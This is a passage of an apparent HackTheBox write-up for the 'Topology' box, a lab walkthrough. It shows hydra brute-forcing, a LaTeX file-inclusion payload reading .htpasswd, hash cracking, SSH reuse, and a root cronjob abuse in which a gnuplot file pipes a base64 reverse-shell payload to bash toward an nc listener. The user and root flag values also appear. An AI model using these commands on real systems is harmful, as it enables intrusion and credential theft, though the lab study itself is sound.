<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/topology/stats-subdomain-homepage.png" alt="Stats subdomain homepage" /></p>
<p>It's just a page displaying a graph of the server load over time.</p>
<p>If we browse to the other subdomain we found, <code>dev.topology.htb</code>, we're asked to
authenticate using HTTP authentication.</p>
<p>If we check this login request's response using Burp Suite, we see that it uses
the 'Basic' scheme with a realm set to 'Under construction'.</p>
<p>Let's use <code>hydra</code> to try finding valid credentials using
<a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt">this wordlist</a>
for the usernames and
<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-passwords-shortlist.txt">this wordlist</a>
for the passwords.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> hydra<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>L</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>P</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/share/wordlists/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>dev.topology.htb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http-get<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">1 of 1 target completed, 0 valid password found
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<p>It failed.</p>
<h4 id="lfi">LFI</h4>
<p>We know that the web server is Apache, and Apache uses <code>.htpasswd</code> file to
handle HTTP authentication. Therefore, there should be a <code>.htpasswd</code> file in
<code>/var/www/dev</code> containing credentials for this subdomain!</p>
<p>Let's retrieve them using the LFI we identified with the payload
<code>$\lstinputlisting{/var/www/dev/.htpasswd}$</code>:</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/topology/latex-subdomain-equation-lfi-dev-subdomain-auth.png" alt="Latex subdomain equation lfi /var/www/dev/.htpasswd" /></p>
<p>We find credentials for <code>vdaisley</code>! The password is hashed though:
<code>$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0</code>. I'll place it in a <code>apache.hash</code> file.</p>
<h4 id="hash-cracking">Hash cracking</h4>
<p>Let's try to crack this hash using <code>hashcat</code> with the <code>rockyou.txt</code> wordlist.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> hashcat<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1600<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/apache.hash<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>a</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>0<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/share/wordlists/rockyou.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0:calculus20
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<p><code>vdaisley</code>'s hash corresponds to the <code>calculus20</code> password!</p>
<h4 id="exploration-4">Exploration</h4>
<p>Let's head back to the <code>dev.topology.htb</code> subdomain, and use the credentials we
just discovered to authenticate.</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/topology/dev-subdomain-homepage.png" alt="Dev subdomain homepage" /></p>
<p>From what I understand, it's a portfolio of Klein and Daisley, two people
working at the Department of Mathematics at Miskatonic University. They're
specialized in developing mathematical software.</p>
<h4 id="fingerprinting-3">Fingerprinting</h4>
<p>Let's fingerprint the technologies used by this web page with the
<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/topology/dev-subdomain-homepage-wappalyzer.png" alt="Dev subdomain homepage Wappalyzer extension" /></p>
<p>The footer of the website leaks that it's using
<a href="https://github.com/rajshekhar26/cleanfolio-minimal">a template</a> made by
<a href="https://github.com/rajshekhar26">rajshekhar26</a>.</p>
<h4 id="exploration-5">Exploration</h4>
<p>In the 'Projects' section of the page, the 'LaTeX Equation Generator' project is
mentioned. It must be the <code>/equation.php</code> web page of the <code>latex.topology.htb</code>
subdomain.</p>
<p>However, there's also a mention of a 'PHPMyRefDB' project, which is 'Currently
under development'. This could be interesting!</p>
<h2 id="foothold-ssh">Foothold (SSH)</h2>
<p>I fell into a rabbit hole trying to find this project, but it's not hosted on
the web server.</p>
<p>If we check the <code>/etc/passwd</code> file, we find an entry for the <code>vdaisley</code> user,
which is also likely the administrator of the Apache server. Maybe he reused the
credentials we found for the <code>dev.topology.htb</code> subdomain for SSH?</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ssh <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>vdaisley@10.10.11.217<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">The authenticity of host &#39;10.10.11.217 (10.10.11.217)&#39; can&#39;t be established.
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">vdaisley@10.10.11.217&#39;s password:
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">vdaisley@topology:~$
</span></code></pre>
<p>Nice!</p>
<h2 id="getting-a-lay-of-the-land">Getting a lay of the land</h2>
<p>If we run <code>whoami</code>, we see that we got a foothold as <code>vdaisley</code> (obviously).</p>
<h3 id="architecture">Architecture</h3>
<p>What is Topology's architecture?</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">vdaisley@topology:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">x86_64
</span></code></pre>
<p>It's using x86_64. Let's keep that in mind to select the appropriate binaries.</p>
<h3 id="distribution">Distribution</h3>
<p>Let's see which distribution Topology is using.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">vdaisley@topology:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/lsb-release<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">DISTRIB_ID=Ubuntu
</span><span class="z-text z-plain">DISTRIB_RELEASE=20.04
</span><span class="z-text z-plain">DISTRIB_CODENAME=focal
</span><span class="z-text z-plain">DISTRIB_DESCRIPTION=&quot;Ubuntu 20.04.6 LTS&quot;
</span></code></pre>
<p>Okay, so it's Ubuntu 20.04.</p>
<h3 id="kernel">Kernel</h3>
<p>Let's find the kernel version of Topology.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">vdaisley@topology:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">5.4.0-150-generic
</span></code></pre>
<p>It's <code>5.4.0</code>.</p>
<h3 id="users">Users</h3>
<p>Let's enumerate all users.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">vdaisley@topology:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> grep <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>.*sh$<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/passwd<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">root
</span><span class="z-text z-plain">vdaisley
</span></code></pre>
<p>There's <code>vdaisley</code> (us) and <code>root</code>.</p>
<h3 id="groups">Groups</h3>
<p>Let's enumerate all groups.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">vdaisley@topology:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/group<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">adm
</span><span class="z-text z-plain">audio
</span><span class="z-text z-plain">avahi
</span><span class="z-text z-plain">backup
</span><span class="z-text z-plain">bin
</span><span class="z-text z-plain">bluetooth
</span><span class="z-text z-plain">cdrom
</span><span class="z-text z-plain">colord
</span><span class="z-text z-plain">crontab
</span><span class="z-text z-plain">daemon
</span><span class="z-text z-plain">dialout
</span><span class="z-text z-plain">dip
</span><span class="z-text z-plain">disk
</span><span class="z-text z-plain">fax
</span><span class="z-text z-plain">floppy
</span><span class="z-text z-plain">fwupd-refresh
</span><span class="z-text z-plain">games
</span><span class="z-text z-plain">gdm
</span><span class="z-text z-plain">geoclue
</span><span class="z-text z-plain">gnats
</span><span class="z-text z-plain">input
</span><span class="z-text z-plain">irc
</span><span class="z-text z-plain">kmem
</span><span class="z-text z-plain">kvm
</span><span class="z-text z-plain">_laurel
</span><span class="z-text z-plain">list
</span><span class="z-text z-plain">lp
</span><span class="z-text z-plain">lpadmin
</span><span class="z-text z-plain">lxd
</span><span class="z-text z-plain">mail
</span><span class="z-text z-plain">man
</span><span class="z-text z-plain">messagebus
</span><span class="z-text z-plain">mysql
</span><span class="z-text z-plain">netdev
</span><span class="z-text z-plain">news
</span><span class="z-text z-plain">nogroup
</span><span class="z-text z-plain">operator
</span><span class="z-text z-plain">plugdev
</span><span class="z-text z-plain">proxy
</span><span class="z-text z-plain">pulse
</span><span class="z-text z-plain">pulse-access
</span><span class="z-text z-plain">render
</span><span class="z-text z-plain">root
</span><span class="z-text z-plain">rtkit
</span><span class="z-text z-plain">sambashare
</span><span class="z-text z-plain">saned
</span><span class="z-text z-plain">sasl
</span><span class="z-text z-plain">scanner
</span><span class="z-text z-plain">shadow
</span><span class="z-text z-plain">src
</span><span class="z-text z-plain">ssh
</span><span class="z-text z-plain">ssl-cert
</span><span class="z-text z-plain">staff
</span><span class="z-text z-plain">sudo
</span><span class="z-text z-plain">sys
</span><span class="z-text z-plain">syslog
</span><span class="z-text z-plain">systemd-coredump
</span><span class="z-text z-plain">systemd-journal
</span><span class="z-text z-plain">systemd-network
</span><span class="z-text z-plain">systemd-resolve
</span><span class="z-text z-plain">systemd-timesync
</span><span class="z-text z-plain">tape
</span><span class="z-text z-plain">tss
</span><span class="z-text z-plain">tty
</span><span class="z-text z-plain">users
</span><span class="z-text z-plain">utmp
</span><span class="z-text z-plain">uucp
</span><span class="z-text z-plain">uuidd
</span><span class="z-text z-plain">vdaisley
</span><span class="z-text z-plain">video
</span><span class="z-text z-plain">voice
</span><span class="z-text z-plain">www-data
</span></code></pre>
<p>The <code>lxd</code> group is interesting to elevate privileges.</p>
<h3 id="nics">NICs</h3>
<p>Let's gather the list of connected NICs.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">vdaisley@topology:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ifconfig</span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
</span><span class="z-text z-plain">        inet 10.10.11.217  netmask 255.255.254.0  broadcast 10.10.11.255
</span><span class="z-text z-plain">        inet6 fe80::250:56ff:feb9:4105  prefixlen 64  scopeid 0x20&lt;link&gt;
</span><span class="z-text z-plain">        inet6 dead:beef::250:56ff:feb9:4105  prefixlen 64  scopeid 0x0&lt;global&gt;
</span><span class="z-text z-plain">        ether 00:50:56:b9:41:05  txqueuelen 1000  (Ethernet)
</span><span class="z-text z-plain">        RX packets 11806  bytes 2291008 (2.2 MB)
</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
</span><span class="z-text z-plain">        TX packets 12298  bytes 5717834 (5.7 MB)
</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
</span><span class="z-text z-plain">        inet 127.0.0.1  netmask 255.0.0.0
</span><span class="z-text z-plain">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
</span><span class="z-text z-plain">        loop  txqueuelen 1000  (Local Loopback)
</span><span class="z-text z-plain">        RX packets 2502  bytes 208038 (208.0 KB)
</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
</span><span class="z-text z-plain">        TX packets 2502  bytes 208038 (208.0 KB)
</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span></code></pre>
<p>There's an Ethernet interface and the loopback interface.</p>
<h3 id="hostname">Hostname</h3>
<p>What is Topology's hostname?</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">vdaisley@topology:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> hostname</span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">topology
</span></code></pre>
<p>Yeah I know, very surprising.</p>
<h2 id="system-enumeration">System enumeration</h2>
<h3 id="flags">Flags</h3>
<p>If we check our home folder, we find the user flag.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">vdaisley@topology:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/home/vdaisley/user.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">71fe1149f013c182f54bba5b84b32a70
</span></code></pre>
<h3 id="exploring-opt">Exploring <code>/opt</code></h3>
<p>If we explore <code>/opt</code>, we notice a <code>gnuplot</code> folder:</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">vdaisley@topology:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>la</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/opt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">drwxr-xr-x  3 root root 4096 May 19  2023 .
</span><span class="z-text z-plain">drwxr-xr-x 18 root root 4096 Jun 12  2023 ..
</span><span class="z-text z-plain">drwx-wx-wx  2 root root 4096 Jun 14  2023 gnuplot
</span></code></pre>
<p>Weirdly, we can write to this folder, but we can't read it.</p>
<p>If we run <code>pspy</code>, we see that there's a cronjob running every minute that
executes all PLT files in the <code>/opt/gnuplot</code> folder as <code>root</code>. This is probably
used to execute scripts to update the graph for the <code>stats.topology.htb</code>
subdomain.</p>
<p>The good news is that we have write access to the <code>/opt/gnuplot</code> folder, and
that <code>root</code> executes all PLT files in this folder. This means that we can create
a PLT file that will be executed using <code>gnuplot</code> as <code>root</code>!</p>
<h2 id="privilege-escalation-cronjob">Privilege escalation (Cronjob)</h2>
<p>The <code>gnuplot</code> utility is a program that can generate two-dimensional and
three-dimentional plots of functions, data, and data fits.</p>
<p>This utility can execute PLT files.</p>
<h3 id="preparation">Preparation</h3>
<p>The goal is to obtain a reverse shell.</p>
<p>First, I'll setup a listener to receive the shell.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>9001<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<p>Then, I'll choose the Base64 encoded version of the 'Bash -i' payload from
<a href="https://www.revshells.com/">RevShells</a> configured to obtain a <code>/bin/bash</code>
shell.</p>
<h3 id="exploitation">Exploitation</h3>
<p>I'll create a <code>privesc.plt</code> file in <code>/opt/gnuplot</code> to execute this command:</p>
<pre data-lang="py" class="language-py z-code"><code class="language-py" data-lang="py"><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">system</span></span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">/bin/echo &lt;BASE64_REVSHELL_PAYLOAD&gt; | /usr/bin/base64 -d | /bin/bash -i<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span></code></pre>
<p>We just have to wait for the cronjob to execute. Then, if we check our listener:</p>
<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.2] from (UNKNOWN) [10.10.11.217] 47046
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">root@topology:~#
</span></code></pre>
<p>It caught the reverse shell!</p>
<h3 id="establishing-persistence">Establishing persistence</h3>
<p>Let's use SSH to establish persistence.</p>
<p>Our home folder doesn't contain a <code>.ssh</code> folder, so I'll create one. Then I'll
create a private key, and I'll add the corresponding public key to
<code>authorized_keys</code>. Finally, I'll connect over SSH to Topology as <code>root</code>.</p>
<h2 id="system-enumeration-1">System enumeration</h2>
<p>If we run <code>whoami</code>, we see that we're <code>root</code>!</p>
<h3 id="flags-1">Flags</h3>
<p>As usual, we can find the root flag in our home folder.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">root@topology:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>#</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/root/root.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">ce704948f4332e8566d01f9e1c0ec835
</span></code></pre>
<h1 id="afterwords">Afterwords</h1>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/topology/success.png" alt="Success" /></p>
<p>That's it for this box! 🎉</p>
<p>I rated the user flag as 'Not too easy' and the root flag as 'Easy'. The
foothold required to first find a LFI that wasn't blacklisted through a LaTeX
injection, then to discover the <code>dev.topology.htb</code> subdomain and then to use the
LFI to retrieve <code>vdaisley</code> password, which worked over SSH. The privilege
escalation was much easier, it was tricky to identify but trivial to exploit
thanks to online documentation.</p>
<p>Thanks for reading!</p>
</section>
</article>

    </main>

        <footer></footer>

    </body>
</html>
